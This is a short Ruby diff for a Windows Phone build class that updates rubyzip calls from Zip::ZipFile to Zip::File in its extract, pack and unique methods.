@@ -21,7 +21,7 @@ class BuildWinPhone < Build
 
     trace :debug, "Build: xap extract"
 
-    Zip::ZipFile.open(path('core.xap')) do |z|
+    Zip::File.open(path('core.xap')) do |z|
       z.each do |f|
         f_path = path('xap/' + f.name)
         FileUtils.mkdir_p(File.dirname(f_path))
@@ -72,7 +72,7 @@ class BuildWinPhone < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       @outputs.each do |output|
         if File.file?(path(output))
           z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
@@ -85,7 +85,7 @@ class BuildWinPhone < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       z.each do |f|
         f_path = path(f.name)
         FileUtils.mkdir_p(File.dirname(f_path))
@@ -97,7 +97,7 @@ class BuildWinPhone < Build
       end
     end
 
-    Zip::ZipFile.open(path('core.xap')) do |z|
+    Zip::File.open(path('core.xap')) do |z|
       core_content = z.file.open('MyPhoneInfo.dat', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('MyPhoneInfo.dat'), "wb") {|f| f.write core_content}
